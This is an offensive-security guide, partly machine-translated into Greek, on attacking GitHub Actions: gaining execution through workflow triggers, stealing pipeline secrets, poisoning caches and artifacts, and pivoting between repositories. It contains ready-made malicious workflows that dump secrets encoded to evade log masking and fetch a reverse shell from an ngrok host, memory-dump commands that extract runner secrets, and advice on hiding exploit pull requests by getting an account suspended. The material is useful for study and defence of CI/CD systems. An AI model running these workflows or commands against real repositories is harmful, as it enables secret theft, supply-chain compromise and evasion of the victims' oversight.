# Abusing Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

In this page you will find:

- A **summary of all the impacts** of an attacker managing to access a Github Action
- Different ways to **get access to an action**:
- Having **permissions** to create the action
- Abusing **pull request** related triggers
- Abusing **other external access** techniques
- **Pivoting** from an already compromised repo
- Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

If you can **execute arbitrary code in GitHub Actions** within a **repository**, you may be able to:

- **Steal secrets** mounted to the pipeline and **abuse the pipeline's privileges** to gain unauthorized access to external platforms, such as AWS and GCP.
- **Compromise deployments** and other **artifacts**.
- If the pipeline deploys or stores assets, you could alter the final product, enabling a supply chain attack.
- **Execute code in custom workers** to abuse computing power and pivot to other systems.
- **Overwrite repository code**, depending on the permissions associated with the `GITHUB_TOKEN`.

## GITHUB_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Εγκρίνω PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Δημιουργία PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Σημειώστε ότι σε πολλές περιπτώσεις θα μπορείτε να βρείτε **tokens χρηστών github μέσα σε περιβάλλοντα Github Actions ή στα μυστικά**. Αυτά τα tokens μπορεί να σας δώσουν περισσότερα δικαιώματα πάνω στο αποθετήριο και την οργάνωση.

<details>

<summary>Λίστα μυστικών στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Απόκτηση αντίστροφης θύρας με μυστικά</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Είναι δυνατόν να ελέγξετε τα δικαιώματα που έχουν δοθεί σε ένα Github Token σε άλλα αποθετήρια χρηστών **ελέγχοντας τα αρχεία καταγραφής** των ενεργειών:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Επιτρεπόμενη Εκτέλεση

> [!NOTE]
> Αυτή θα ήταν η πιο εύκολη μέθοδος για να συμβιβαστούν οι Github actions, καθώς αυτή η περίπτωση υποθέτει ότι έχετε πρόσβαση για **δημιουργία νέου αποθετηρίου στην οργάνωση**, ή έχετε **δικαιώματα εγγραφής σε ένα αποθετήριο**.
>
> Εάν βρίσκεστε σε αυτό το σενάριο μπορείτε απλά να ελέγξετε τις [Τεχνικές Μετά την Εκμετάλλευση](./#post-exploitation-techniques-from-inside-an-action).

### Εκτέλεση από Δημιουργία Αποθετηρίου

Σε περίπτωση που τα μέλη μιας οργάνωσης μπορούν να **δημιουργήσουν νέα αποθετήρια** και μπορείτε να εκτελέσετε τις github actions, μπορείτε να **δημιουργήσετε ένα νέο αποθετήριο και να κλέψετε τα μυστικά που έχουν οριστεί σε επίπεδο οργάνωσης**.

### Εκτέλεση από Νέο Κλάδο

Εάν μπορείτε να **δημιουργήσετε ένα νέο κλάδο σε ένα αποθετήριο που ήδη περιέχει μια ρυθμισμένη Github Action**, μπορείτε να **τροποποιήσετε** αυτήν, **να ανεβάσετε** το περιεχόμενο και στη συνέχεια να **εκτελέσετε αυτήν την ενέργεια από τον νέο κλάδο**. Με αυτόν τον τρόπο μπορείτε να **εξάγετε μυστικά σε επίπεδο αποθετηρίου και οργάνωσης** (αλλά πρέπει να γνωρίζετε πώς ονομάζονται).

Μπορείτε να κάνετε την τροποποιημένη ενέργεια εκτελέσιμη **χειροκίνητα,** όταν **δημιουργείται ένα PR** ή όταν **ωθείται κάποιος κώδικας** (ανάλογα με το πόσο θόρυβο θέλετε να κάνετε):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Forked Execution

> [!NOTE]
> Υπάρχουν διάφοροι ενεργοποιητές που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **εκτελέσει μια Github Action από άλλο αποθετήριο**. Εάν αυτές οι ενεργοποιήσιμες ενέργειες είναι κακώς ρυθμισμένες, ένας επιτιθέμενος θα μπορούσε να είναι σε θέση να τις παραβιάσει.

### `pull_request`

Ο ενεργοποιητής ροής **`pull_request`** θα εκτελεί τη ροή κάθε φορά που λαμβάνεται ένα pull request με κάποιες εξαιρέσεις: από προεπιλογή, αν είναι η **πρώτη φορά** που **συνεργάζεστε**, κάποιος **διαχειριστής** θα χρειαστεί να **εγκρίνει** την **εκτέλεση** της ροής:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Καθώς ο **προεπιλεγμένος περιορισμός** ισχύει για **πρώτους** συνεισφέροντες, θα μπορούσατε να συνεισφέρετε **διορθώνοντας ένα έγκυρο σφάλμα/τυπογραφικό λάθος** και στη συνέχεια να στείλετε **άλλα PRs για να εκμεταλλευτείτε τα νέα σας `pull_request` προνόμια**.
>
> **Το δοκίμασα και δεν λειτουργεί**: ~~Μια άλλη επιλογή θα ήταν να δημιουργήσετε έναν λογαριασμό με το όνομα κάποιου που συνέβαλε στο έργο και διέγραψε τον λογαριασμό του.~~

Επιπλέον, από προεπιλογή **αποτρέπει τις δικαιώματα εγγραφής** και **πρόσβαση σε μυστικά** στο στοχευμένο αποθετήριο όπως αναφέρεται στα [**έγγραφα**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Με την εξαίρεση του `GITHUB_TOKEN`, **τα μυστικά δεν μεταφέρονται στον εκτελεστή** όταν μια ροή ενεργοποιείται από ένα **forked** αποθετήριο. Το **`GITHUB_TOKEN` έχει δικαιώματα μόνο για ανάγνωση** σε pull requests **από forked αποθετήρια**.

Ένας επιτιθέμενος θα μπορούσε να τροποποιήσει τον ορισμό της Github Action προκειμένου να εκτελέσει αυθαίρετα πράγματα και να προσθέσει αυθαίρετες ενέργειες. Ωστόσο, δεν θα είναι σε θέση να κλέψει μυστικά ή να αντικαταστήσει το repo λόγω των αναφερόμενων περιορισμών.

> [!CAUTION]
> **Ναι, αν ο επιτιθέμενος αλλάξει στο PR την github action που θα ενεργοποιηθεί, η Github Action του θα είναι αυτή που θα χρησιμοποιηθεί και όχι αυτή από το αρχικό repo!**

Καθώς ο επιτιθέμενος ελέγχει επίσης τον κώδικα που εκτελείται, ακόμη και αν δεν υπάρχουν μυστικά ή δικαιώματα εγγραφής στο `GITHUB_TOKEN`, ένας επιτιθέμενος θα μπορούσε για παράδειγμα να **ανεβάσει κακόβουλα αρχεία**.

### **`pull_request_target`**

Ο ενεργοποιητής ροής **`pull_request_target`** έχει **δικαιώματα εγγραφής** στο στοχευμένο αποθετήριο και **πρόσβαση σε μυστικά** (και δεν ζητά άδεια).

Σημειώστε ότι ο ενεργοποιητής ροής **`pull_request_target`** **εκτελείται στο βασικό πλαίσιο** και όχι σε αυτό που παρέχεται από το PR (για **να μην εκτελείται μη αξιόπιστος κώδικας**). Για περισσότερες πληροφορίες σχετικά με το `pull_request_target` [**ελέγξτε τα έγγραφα**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Επιπλέον, για περισσότερες πληροφορίες σχετικά με αυτή τη συγκεκριμένη επικίνδυνη χρήση, ελέγξτε αυτήν την [**ανάρτηση στο blog του github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Μπορεί να φαίνεται ότι επειδή η **εκτελούμενη ροή** είναι αυτή που ορίζεται στη **βάση** και **όχι στο PR**, είναι **ασφαλές** να χρησιμοποιείτε **`pull_request_target`**, αλλά υπάρχουν **μερικές περιπτώσεις όπου δεν είναι**.

Και αυτή θα έχει **πρόσβαση σε μυστικά**.

### `workflow_run`

Ο ενεργοποιητής [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) επιτρέπει την εκτέλεση μιας ροής από μια διαφορετική όταν είναι `completed`, `requested` ή `in_progress`.

Σε αυτό το παράδειγμα, μια ροή είναι ρυθμισμένη να εκτελείται μετά την ολοκλήρωση της ξεχωριστής ροής "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

This kind of workflow could be attacked if it's **depending** on a **workflow** that can be **triggered** by an external user via **`pull_request`** or **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** The first one consist on the **`workflow_run`** triggered workflow downloading out the attackers code: `${{ github.event.pull_request.head.sha }}`\
The second one consist on **passing** an **artifact** from the **untrusted** code to the **`workflow_run`** workflow and using the content of this artifact in a way that makes it **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Check if when executed from a pull_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

We have mentioned all the ways an external attacker could manage to make a github workflow to execute, now let's take a look about how this executions, if bad configured, could be abused:

### Untrusted checkout execution

In the case of **`pull_request`,** the workflow is going to be executed in the **context of the PR** (so it'll execute the **malicious PRs code**), αλλά κάποιος πρέπει να **το εξουσιοδοτήσει πρώτα** και θα εκτελείται με κάποιους [περιορισμούς](./#pull_request).

In case of a workflow using **`pull_request_target` or `workflow_run`** that depends on a workflow that can be triggered from **`pull_request_target` or `pull_request`** the code from the original repo will be executed, so the **attacker cannot control the executed code**.

> [!CAUTION]
> However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Note that there are certain [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) whose values are **controlled** by the **user** creating the PR. If the github action is using that **data to execute anything**, it could lead to **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

If an attacker could **inject any value** inside this **env** variable, he could inject env variables that could execute code in following steps such as **LD_PRELOAD** or **NODE_OPTIONS**.

For example ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine a workflow that is trusting an uploaded artifact to store its content inside **`GITHUB_ENV`** env variable. An attacker could upload something like this to compromise it:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

The thing problem is that if the **`path`** parameter isn't set, the artifact is extracted in the current directory and it can override files that could be later used or even executed in the workflow. Therefore, if the Artifact is vulnerable, an attacker could abuse this to compromise other workflows trusting the Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Αυτό θα μπορούσε να επιτεθεί με αυτό το ροή εργασίας:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Άλλη Εξωτερική Πρόσβαση

### Απαγωγή Διαγραφέντος Namespace Repo

Εάν ένας λογαριασμός αλλάξει όνομα, ένας άλλος χρήστης θα μπορούσε να εγγραφεί με αυτό το όνομα μετά από κάποιο χρονικό διάστημα. Εάν ένα αποθετήριο είχε **λιγότερα από 100 αστέρια πριν την αλλαγή ονόματος**, το Github θα επιτρέψει στον νέο εγγεγραμμένο χρήστη με το ίδιο όνομα να δημιουργήσει ένα **αποθετήριο με το ίδιο όνομα** όπως αυτό που διαγράφηκε.

> [!CAUTION]
> Έτσι, εάν μια ενέργεια χρησιμοποιεί ένα αποθετήριο από έναν ανύπαρκτο λογαριασμό, είναι ακόμα δυνατόν ένας επιτιθέμενος να δημιουργήσει αυτόν τον λογαριασμό και να συμβιβάσει την ενέργεια.

Εάν άλλα αποθετήρια χρησιμοποιούσαν **εξαρτήσεις από αυτά τα αποθετήρια του χρήστη**, ένας επιτιθέμενος θα είναι σε θέση να τα απαγάγει. Εδώ έχετε μια πιο ολοκληρωμένη εξήγηση: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Σε αυτή την ενότητα θα μιλήσουμε για τεχνικές που θα επιτρέψουν να **περάσουμε από ένα αποθετήριο σε άλλο** υποθέτοντας ότι έχουμε κάποια πρόσβαση στο πρώτο (ελέγξτε την προηγούμενη ενότητα).

### Δηλητηρίαση Cache

Μια cache διατηρείται μεταξύ **των εκτελέσεων ροής εργασίας στην ίδια κλάδο**. Αυτό σημαίνει ότι εάν ένας επιτιθέμενος **συμβιβάσει** ένα **πακέτο** που αποθηκεύεται στη cache και **κατεβάζεται** και εκτελείται από μια **πιο προνομιούχα** ροή εργασίας, θα είναι σε θέση να **συμβιβάσει** και αυτή τη ροή εργασίας.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Δηλητηρίαση Artifact

Οι ροές εργασίας θα μπορούσαν να χρησιμοποιούν **artifacts από άλλες ροές εργασίας και ακόμη και αποθετήρια**, εάν ένας επιτιθέμενος καταφέρει να **συμβιβάσει** την Github Action που **ανεβάζει ένα artifact** που χρησιμοποιείται αργότερα από μια άλλη ροή εργασίας, θα μπορούσε να **συμβιβάσει τις άλλες ροές εργασίας**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Μετά την Εκμετάλλευση από μια Ενέργεια

### Πρόσβαση σε AWS και GCP μέσω OIDC

Ελέγξτε τις παρακάτω σελίδες:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Πρόσβαση σε μυστικά <a href="#accessing-secrets" id="accessing-secrets"></a>

Εάν εισάγετε περιεχόμενο σε ένα σενάριο, είναι ενδιαφέρον να γνωρίζετε πώς μπορείτε να αποκτήσετε πρόσβαση σε μυστικά:

- Εάν το μυστικό ή το token έχει οριστεί σε μια **μεταβλητή περιβάλλοντος**, μπορεί να προσπελαστεί άμεσα μέσω του περιβάλλοντος χρησιμοποιώντας **`printenv`**.

<details>

<summary>Λίστα μυστικών στην έξοδο της Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Πάρτε αντίστροφη θήκη με μυστικά</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Αν το μυστικό χρησιμοποιείται **άμεσα σε μια έκφραση**, το παραγόμενο shell script αποθηκεύεται **σε δίσκο** και είναι προσβάσιμο.
- ```bash
cat /home/runner/work/_temp/*
```
- Για τις JavaScript actions, τα μυστικά αποστέλλονται μέσω μεταβλητών περιβάλλοντος.
- ```bash
ps axe | grep node
```
- Για μια **προσαρμοσμένη ενέργεια**, ο κίνδυνος μπορεί να διαφέρει ανάλογα με το πώς ένα πρόγραμμα χρησιμοποιεί το μυστικό που απέκτησε από το **επιχείρημα**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Κατάχρηση Αυτοφιλοξενούμενων εκτελεστών

Ο τρόπος για να βρείτε ποιες **Github Actions εκτελούνται σε υποδομή εκτός Github** είναι να αναζητήσετε **`runs-on: self-hosted`** στη διαμόρφωση yaml της Github Action.

Οι **αυτοφιλοξενούμενοι** εκτελεστές μπορεί να έχουν πρόσβαση σε **επιπλέον ευαίσθητες πληροφορίες**, σε άλλα **δικτυακά συστήματα** (ευάλωτα σημεία στο δίκτυο; υπηρεσία μεταδεδομένων;) ή, ακόμη και αν είναι απομονωμένοι και καταστραφούν, **περισσότερες από μία ενέργειες μπορεί να εκτελούνται ταυτόχρονα** και η κακόβουλη μπορεί να **κλέψει τα μυστικά** της άλλης.

Σε αυτοφιλοξενούμενους εκτελεστές είναι επίσης δυνατό να αποκτηθούν τα **μυστικά από τη διαδικασία \_Runner.Listener**\_\*\* που θα περιέχει όλα τα μυστικά των ροών εργασίας σε οποιοδήποτε βήμα, εκχυλίζοντας τη μνήμη της:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Δείτε [**αυτή την ανάρτηση για περισσότερες πληροφορίες**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Είναι δυνατόν να δημιουργήσετε Github actions που θα **κατασκευάσουν και θα αποθηκεύσουν μια εικόνα Docker μέσα στο Github**.\
Ένα παράδειγμα μπορεί να βρεθεί στην παρακάτω επεκτάσιμη ενότητα:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Όπως μπορείτε να δείτε στον προηγούμενο κώδικα, το Github registry φιλοξενείται στο **`ghcr.io`**.

Ένας χρήστης με δικαιώματα ανάγνωσης πάνω στο repo θα μπορεί στη συνέχεια να κατεβάσει την εικόνα Docker χρησιμοποιώντας ένα προσωπικό διακριτικό πρόσβασης:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics
{{#endref}}

### Ευαίσθητες πληροφορίες στα αρχεία καταγραφής των Github Actions

Even if **Github** try to **detect secret values** in the actions logs and **avoid showing** them, **other sensitive data** that could have been generated in the execution of the action won't be hidden. For example a JWT signed with a secret value won't be hidden unless it's [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Καλύπτοντας τα Ίχνη σας

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) First of all, any PR raised is clearly visible to the public in Github and to the target GitHub account. In GitHub by default, we **can’t delete a PR of the internet**, but there is a twist. For Github accounts that are **suspended** by Github, all of their **PRs are automatically deleted** and removed from the internet. So in order to hide your activity you need to either get your **GitHub account suspended or get your account flagged**. This would **hide all your activities** on GitHub from the internet (basically remove all your exploit PR)

An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share “some stuff” in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github.

> [!WARNING]
> The only way for an organization to figure out they have been targeted is to check GitHub logs from SIEM since from GitHub UI the PR would be removed.

## Εργαλεία

The following tools are useful to find Github Action workflows and even find vulnerable ones:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{{#include ../../../banners/hacktricks-training.md}}
